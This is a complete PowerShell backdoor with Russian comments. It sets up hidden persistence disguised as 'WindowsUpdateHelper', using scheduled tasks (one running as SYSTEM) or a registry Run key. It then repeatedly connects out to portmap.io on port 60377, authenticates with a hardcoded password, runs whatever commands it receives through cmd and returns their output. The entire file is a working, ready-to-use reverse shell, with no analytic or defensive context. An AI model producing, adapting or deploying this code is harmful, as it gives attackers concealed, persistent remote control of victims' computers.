# Проверка прав администратора и установка автозапуска
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$scriptPath = $MyInvocation.MyCommand.Path
if (-not $scriptPath) { $scriptPath = $PSCommandPath }

# Установка автозапуска (только если ещё не установлен)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$existing = Get-ItemProperty -Path $regPath -Name "WindowsUpdateHelper" -ErrorAction SilentlyContinue
if (-not $existing) {
    if ($isAdmin) {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
        Register-ScheduledTask -TaskName "WindowsUpdateHelper" -Action $action -Trigger $trigger1 -Settings $settings -RunLevel Highest -Force | Out-Null
        $trigger2 = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName "WindowsUpdateHelperSystem" -Action $action -Trigger $trigger2 -Settings $settings -RunLevel Highest -User "SYSTEM" -Force | Out-Null
    } else {
        $cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        Set-ItemProperty -Path $regPath -Name "WindowsUpdateHelper" -Value $cmd
    }
}

# Основной цикл
$REMOTE_HOST    = "portmap.io"
$REMOTE_PORT    = 60377
$PASSWORD       = "zebra123"
$CMD_TIMEOUT    = 10
$RECONNECT_WAIT = 30
$ENCODING       = [System.Text.Encoding]::UTF8

function Send-Line {
    param($Writer, [string]$Text)
    $Writer.WriteLine($Text)
    $Writer.Flush()
}

function Invoke-CommandWithTimeout {
    param([string]$Command, [int]$TimeoutSec)
    $job = Start-Job -ScriptBlock {
        param($cmd)
        try { $out = cmd /c $cmd 2>&1; return $out -join "`n" }
        catch { return "ERROR: $_" }
    } -ArgumentList $Command
    $finished = Wait-Job $job -Timeout $TimeoutSec
    if ($finished) {
        $result = Receive-Job $job
        Remove-Job $job -Force
        if ($result) { return $result } else { return "(нет вывода)" }
    } else {
        Stop-Job $job
        Remove-Job $job -Force
        return "TIMEOUT: команда не завершилась за $TimeoutSec сек"
    }
}

function Start-Session {
    param($Client)
    $stream = $Client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream, $ENCODING)
    $writer = New-Object System.IO.StreamWriter($stream, $ENCODING)
    $writer.AutoFlush = $true
    $prompt = $reader.ReadLine()
    Send-Line $writer $PASSWORD
    $auth = $reader.ReadLine()
    if ($auth -ne "AUTH_OK") { return }
    while ($true) {
        try { $line = $reader.ReadLine() } catch { break }
        if ($null -eq $line) { break }
        $cmd = $line.Trim()
        if ($cmd -eq "") { continue }
        if ($cmd -eq "exit") { Send-Line $writer "BYE"; break }
        $result = Invoke-CommandWithTimeout -Command $cmd -TimeoutSec $CMD_TIMEOUT
        foreach ($outLine in ($result -split "`n")) { Send-Line $writer $outLine }
        Send-Line $writer "<<END>>"
    }
}

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.ConnectAsync($REMOTE_HOST, $REMOTE_PORT).Wait(5000) | Out-Null
        if ($client.Connected) {
            $client.SendTimeout = 5000
            Start-Session -Client $client
        }
        $client.Close()
    } catch {}
    Start-Sleep -Seconds $RECONNECT_WAIT
}
